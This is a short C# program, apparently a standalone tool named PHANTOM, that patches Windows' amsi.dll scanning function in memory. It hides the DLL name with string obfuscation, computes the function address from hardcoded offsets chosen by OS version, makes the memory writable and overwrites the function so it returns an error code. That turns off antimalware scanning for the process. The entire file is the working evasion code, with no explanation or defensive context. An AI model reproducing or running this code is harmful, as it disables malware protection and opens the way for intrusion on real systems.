using System;
using System.Text;
using System.Reflection;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.Devices;

namespace PHANTOM
{
    internal class Program
    {
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtect(IntPtr lpF, UIntPtr dwSize, uint flNewProtect, out uint lpflH);

        public static IntPtr ASLR(IntPtr Relative_F, IntPtr Relative_BaseF, string ModuleName)
        {
            return (IntPtr)((long)Relative_F - (long)Relative_BaseF + (long)GetModuleHandle(ModuleName));
        }

#if x64
        private static IntPtr L = (IntPtr)0x180008260; //May change in the future!
        private static IntPtr M = (IntPtr)0x180003860; //May change in the future!
        private static IntPtr N = (IntPtr)0x180000000;
#else
        private static IntPtr L = (IntPtr)0x10005D60; //May change in the future!
        private static IntPtr M = (IntPtr)0x10005960; //May change in the future!
        private static IntPtr N = (IntPtr)0x10000000;
#endif

        private static uint O = 0x40;

        private static string P = new String(new char[] { '*', 'a', '*', 'm', '*', 's', '*', 'i', '*', '.', '*', 'd', '*', 'l', '*', 'l', '*' })
                                  .Replace(new string(new char[] { '*', 'a', '*', 'm', '*', 's', '*', 'i', '*', '.', '*', 'd', '*', 'l', '*', 'l', '*' }).Substring(0, 1), string.Empty);

        [STAThread]
        static void Main()
        {
            IntPtr Q = IntPtr.Zero;
            string osName = new ComputerInfo().OSFullName;
            Q = osName.Contains(@"11") ? ASLR(L, N, P) : ASLR(M, N, P);
            byte[] R = (IntPtr.Size == 8) ? new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 } : new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
            uint S;
            VirtualProtect(Q, (UIntPtr)R.Length, O, out S);
            Marshal.Copy(R, 0, Q, R.Length);
            VirtualProtect(Q, (UIntPtr)R.Length, S, out S);
        }
    }
}
